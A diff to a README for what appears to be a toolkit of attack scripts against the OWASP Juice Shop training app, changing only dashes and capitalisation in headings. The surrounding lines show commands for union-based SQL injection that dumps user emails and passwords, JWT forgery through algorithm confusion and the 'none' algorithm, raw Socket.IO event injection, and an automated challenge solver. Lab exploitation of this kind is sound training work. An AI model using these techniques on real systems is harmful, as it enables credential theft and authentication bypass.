@@ -25,7 +25,7 @@ repo.
 
 ---
 
-## `union_sqli.py` — SQL injection executor
+## `union_sqli.py` - SQL injection executor
 
 The search endpoint builds raw SQL with the term interpolated into the
 `WHERE`. Unioning with 9 columns exposes anything reachable in the SQLite DB.
@@ -39,7 +39,7 @@ python3 union_sqli.py --base "$BASE_URL" --cookie "$PROXY" query \
   --select "id,email,password" --from "Users" --where "id=1"
 ```
 
-## `jwt_forge.py` — token forgery
+## `jwt_forge.py` - Token forgery
 
 ```bash
 # HS256 signed with the RSA public-key file bytes (algorithm confusion)
@@ -52,7 +52,7 @@ python3 jwt_forge.py none --email jwtn3d@juice-sh.op
 python3 jwt_forge.py hs256 --secret "$JWT_SECRET" --email admin@juice-sh.op
 ```
 
-## `socketio_client.py` — raw Socket.IO events
+## `socketio_client.py` - Raw Socket.IO events
 
 ```bash
 # Emit a verifier event (e.g. Mass Dispel / SVG injection)
@@ -64,7 +64,7 @@ python3 socketio_client.py --base "$BASE_URL" --cookie "$PROXY" \
 python3 socketio_client.py --base "$BASE_URL" --cookie "$PROXY" listen --seconds 10
 ```
 
-## `coding_challenge_solver.mjs` — all 70 coding challenges
+## `coding_challenge_solver.mjs` - All 70 coding challenges
 
 Needs a checkout of the pinned Juice Shop source tree (default
 `./juice-shop`) whose `// vuln-code-snippet` markers are parsed to recompute
